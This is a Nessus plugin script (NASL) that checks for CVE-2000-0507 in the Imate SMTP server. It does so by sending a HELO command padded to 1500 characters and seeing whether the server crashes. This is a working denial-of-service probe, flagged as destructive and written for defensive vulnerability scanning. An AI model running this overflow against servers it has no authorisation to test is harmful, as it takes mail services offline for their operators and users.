#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10435);
 script_version ("$Revision: 1.19 $");
 script_cve_id("CVE-2000-0507");
 script_bugtraq_id(1286);

 script_name(english:"Imate SMTP Server HELO Command Remote Overflow DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote SMTP server is affected by a remote denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote SMTP server crashes when it is issued a HELO command with
an argument longer than 1200 chars.

This problem may allow an attacker to shut down your SMTP server." );
 script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=bugtraq&m=95990195708509&w=2" );
 script_set_attribute(attribute:"solution", value:
"Apply patches available from the vendor." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 
 script_summary(english:"Checks if the remote mail server can be oveflown"); 
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 
 script_family(english:"SMTP problems");
 script_dependencie("smtpserver_detect.nasl", "sendmail_expn.nasl");
 script_exclude_keys("SMTP/wrapped");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("smtp_func.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/smtp");
if(!port)port = 25;
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
 data = smtp_recv_banner(socket:soc);
 crp = string("HELO ", crap(1500), "\r\n");
 send(socket:soc, data:crp);
 data = recv_line(socket:soc, length:4);
 close(soc);
 
 
 soc2 = open_sock_tcp(port);
 if(!soc2)security_warning(port);
 }
}
